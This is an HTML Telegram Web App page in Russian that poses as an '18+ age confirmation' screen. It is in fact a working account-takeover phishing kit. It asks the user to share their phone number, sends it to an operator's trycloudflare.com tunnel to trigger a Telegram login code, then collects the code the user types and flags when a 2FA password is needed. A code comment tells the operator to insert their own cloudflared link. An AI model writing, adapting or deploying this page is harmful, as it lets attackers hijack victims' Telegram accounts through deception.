<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Подтверждение 18+</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body {
            margin: 0; padding: 0; height: 100vh;
            background: linear-gradient(135deg, #1a1a1a, #000);
            color: white; display: flex; flex-direction: column;
            justify-content: center; align-items: center; text-align: center; padding: 20px;
        }
        .logo { font-size: 60px; margin-bottom: 20px; }
        .title { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
        .subtitle { font-size: 14px; color: #aaa; margin-bottom: 40px; padding: 0 20px; }
        
        .btn {
            background: #0088cc; color: white; border: none;
            padding: 15px 30px; border-radius: 50px; font-size: 18px; font-weight: bold;
            cursor: pointer; box-shadow: 0 0 20px rgba(0,136,204,0.5); width: 100%; max-width: 300px;
        }
        .btn:hover { transform: scale(1.05); }
        
        .code-container { display: none; gap: 10px; margin-top: 20px; justify-content: center; }
        .code-input {
            width: 45px; height: 55px; font-size: 24px; text-align: center;
            background: #2a2a2a; border: 1px solid #444; border-radius: 10px;
            color: white; outline: none;
        }
        .code-input:focus { border-color: #0088cc; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <!-- ВАЖНО: ВСТАВЬ СЮДА СВОЮ ССЫЛКУ ОТ CLOUDFLARED -->
    <script>
        const API_URL = "https://cardiac-ongoing-axis-trigger.trycloudflare.com"; 
    </script>

    <div id="step1">
        <div class="logo">🔞</div>
        <div class="title">Подтверждение возраста</div>
        <div class="subtitle">Для доступа нажмите кнопку ниже.</div>
        <button class="btn" onclick="requestPhone()">📱 Поделиться номером</button>
    </div>

    <div id="step2" class="hidden">
        <div class="logo">🔐</div>
        <div class="title">Введите код</div>
        <div class="subtitle">Код отправлен в Telegram.</div>
        <div class="code-container" id="codeContainer" style="display: flex;">
            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 0)">
            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 1)">
            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 2)">
            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 3)">
            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 4)">
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand(); 
        let userPhone = "";

        function requestPhone() {
            tg.requestContact((success, event) => {
                if (success) {
                    userPhone = event.responseUnsafe.contact.phone_number;
                    if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
                    
                    // 1. МГНОВЕННО ПЕРЕКЛЮЧАЕМ ЭКРАН
                    document.getElementById('step1').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                    setTimeout(() => document.querySelectorAll('.code-input')[0].focus(), 100);
                    
                    // 2. ЗАПРОС ОТПРАВЛЯЕМ В ФОНЕ
                    fetch(`${API_URL}/send_code`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({phone: userPhone})
                    })
                    .then(res => res.json())
                    .then(data => {
                        if (!data.success && !data.already) {
                            console.log("Ошибка отправки кода:", data.error);
                        }
                    })
                    .catch(err => console.log("Ошибка сети:", err));
                }
            });
        }

        function moveNext(input, index) {
            if (input.value.length === 1) {
                const nextInput = document.querySelectorAll('.code-input')[index + 1];
                if (nextInput) nextInput.focus();
                else {
                    let code = "";
                    document.querySelectorAll('.code-input').forEach(el => code += el.value);
                    if (code.length === 5) {
                        fetch(`${API_URL}/verify_code`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({phone: userPhone, code: code})
                        })
                        .then(res => res.json())
                        .then(data => {
                            if (data.success) {
                                tg.close();
                            } else if (data.needs_password) {
                                alert("Требуется 2FA пароль!");
                            } else {
                                alert("Ошибка: " + data.error);
                            }
                        });
                    }
                }
            }
        }
    </script>
</body>
</html>
